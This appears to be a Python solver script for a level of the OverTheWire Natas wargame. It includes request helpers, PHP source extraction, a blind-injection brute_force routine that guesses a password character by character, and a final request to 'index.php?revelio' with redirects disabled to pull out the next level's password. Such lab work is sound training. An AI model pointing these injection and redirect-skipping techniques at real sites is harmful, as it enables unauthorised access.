import os
import requests

from requests.auth import HTTPBasicAuth

import bs4
import html

import pathlib
import re

import string

from tqdm import tqdm

import typing

# utilities
file = os.path.basename(__file__).split(".")
file = file[0]
file = file[file.find("natas")+5:]

level = int(file)

username = f"natas{level}"
password = None
website = f"http://{username}.natas.labs.overthewire.org/"

char_set = [*(string.ascii_letters + string.digits)]

result = None

with open(f"./natas/password/natas{level:02}-password.txt", "r") as f:
    password = f.read()

def send_get_request(website: str, username: str = None, password: str = None, params: dict = None, headers: dict = None, cookies: dict = None, get_body: bool = True, verbose: bool = True) -> tuple[requests.Response, bs4.Tag]:
    if verbose:
        print(f"Sending <GET> request to {website}")
        
        if username and password:
            print(f"Username : {username}")
        
        if username and password:
            print(f"Password : {password}")
        
        print()

        r = requests.get(website, auth=HTTPBasicAuth(username, password), params=params, headers=headers, cookies=cookies, allow_redirects=False)

        print("Parsing HTML", end="...")
        soup = bs4.BeautifulSoup(r.content, "html.parser")
        print("Done\n")

        if get_body:
            print("Retrieving <body> tag", end="...")
            soup = soup.find("body")
            print("Done\n")


        print(soup)
        print()
    
    else:
        r = requests.get(website, auth=HTTPBasicAuth(username, password), params=params, headers=headers, cookies=cookies)
        soup = bs4.BeautifulSoup(r.content, "html.parser")
        if get_body:
            soup = soup.find("body")


    return (r, soup)

def send_post_request(website: str, data: dict, username: str = None, password: str = None, headers: dict = None, cookies: dict = None, files: dict = None, get_body: bool = True, verbose: bool = True) -> tuple[requests.Response, bs4.Tag]:
    if verbose:
        print(f"Sending <POST> request to {website}")
        
        if username and password:
            print(f"Username : {username}")
        
        if username and password:
            print(f"Password : {password}")
        
        print()

        r = requests.post(website, auth=HTTPBasicAuth(username, password), data=data, headers=headers, cookies=cookies, files=files)

        print("Parsing HTML", end="...")
        soup = bs4.BeautifulSoup(r.content, "html.parser")
        print("Done\n")

        if get_body:
            print("Retrieving <body> tag", end="...")
            soup = soup.find("body")
            print("Done\n")


        print(soup)
        print()
    
    else:
        r = requests.post(website, auth=HTTPBasicAuth(username, password), data=data, headers=headers, cookies=cookies, files=files)
        soup = bs4.BeautifulSoup(r.content, "html.parser")
        if get_body:
            soup = soup.find("body")

    return (r, soup)

def save_password(result: str, level: int = level) -> pathlib.Path:
    result = result.strip("\n")

    print(f"Password found : {result}\n")

    dir = f"./natas/password/natas{level+1:02}-password.txt"

    print(f"Saving to file {dir}", end="...")
    with open(dir, "w+") as f:
        f.write(result or "")
    print("Done")

    print()

    return pathlib.Path(dir)

def join_website_dir(website: str, *dir: str) -> str:
    dir = map(str, dir)

    res = website.strip("/")

    for d in dir:
        res += "/"
        res += d.strip("/")

    return res

def find_element(element: str, soup: bs4.BeautifulSoup | bs4.Tag , all: bool = False) -> bs4.Tag | bs4.ResultSet[bs4.Tag]:
    print(f"Finding <{element}>", end="...")
    if all:
        res = soup.find_all(element)
    else:
        res = soup.find(element)
    print("Done\n")
    
    return res

def extract_php_code(source_soup: bs4.BeautifulSoup, diff: str = None) -> pathlib.Path:
    dir = f"./natas/code/natas{level:02}{'-' + diff if diff else ''}.php"

    if os.path.exists(dir):
        return dir
    
    content = source_soup.get_text(separator="\n")
    content = content.splitlines()
    content = "".join(filter(lambda c: not "//" in c, content))
    content = "".join([s if s.isprintable() else " " for s in content])
    
    # with open(dir, "w+") as f:    
    #     f.write("<?php\n" + content)

    print(f"Extracting PHP Code to {dir}", end="...")
    code = html.unescape(content)

    code = re.findall("<\?.*?\?>", code)

    code = [c[2:-2] for c in code]
    code = [c for c in code if not c.startswith("=")]

    code = [re.sub("/\*.*?\*/", "", c) for c in code]

    code = "\n".join(code)
    code = code.replace("php", "")
    
    with open(dir, "w+") as f:
        f.write("<?php\n" + code)

    print("Done")

    return pathlib.Path(dir)

def brute_force(website: str, post_mode: bool, key: str, query: str, username: str, password: str, check_func: typing.Callable, match: bool, match_query: str = None) -> list:
    char_set = [*(string.ascii_letters + string.digits)]

    if match:
        if not match_query:
            return

        char_set = [*(string.ascii_letters + string.digits)]
        match_set = []

        for c in tqdm(char_set):            
            inject_response, inject_soup = send_post_request(website=website, data={"username": match_query.format(data=c)}, username=username, password=password, verbose=False)

            if check_func(inject_response, inject_soup):
                match_set.append(c)
                print(f'\nMatch Found : "{c}"\n')
        
        char_set = match_set

    result = ""

    while len(result) != 32:
        print(f"\nConstructing : {result.ljust(32, '-')} ({len(result)/32*100:.02f}%)\n")

        for char in tqdm(char_set):
            cur_pass = result + char
            
            if post_mode:
                inject_response, inject_soup = send_post_request(website=website, data={key: query.format(data=cur_pass)}, username=username, password=password, verbose=False)
            else:
                inject_response, inject_soup = send_get_request(website=website, params={key: query.format(data=cur_pass)}, username=username, password=password, verbose=False)


            if check_func(inject_response, inject_soup):
                result = cur_pass
                break

    print()

    return result

# code starts here
response, soup = send_get_request(website=website, username=username, password=password)

source = find_element("a", soup)
source = source.attrs["href"]

source_response, source_soup = send_get_request(website=join_website_dir(website, source), username=username, password=password, get_body=False)

php_path = extract_php_code(source_soup=source_soup)

# Format with Ctrl+Shift+P -> Format Document
final_response, final_soup = send_get_request(website=join_website_dir(website, "index.php?revelio"), username=username, password=password, get_body=False)

content = final_soup.get_text()

content = content.splitlines()

content = [c for c in content if "Password" in c][0]
content = content.split()

result = content[-1]

password_dir = save_password(result=result)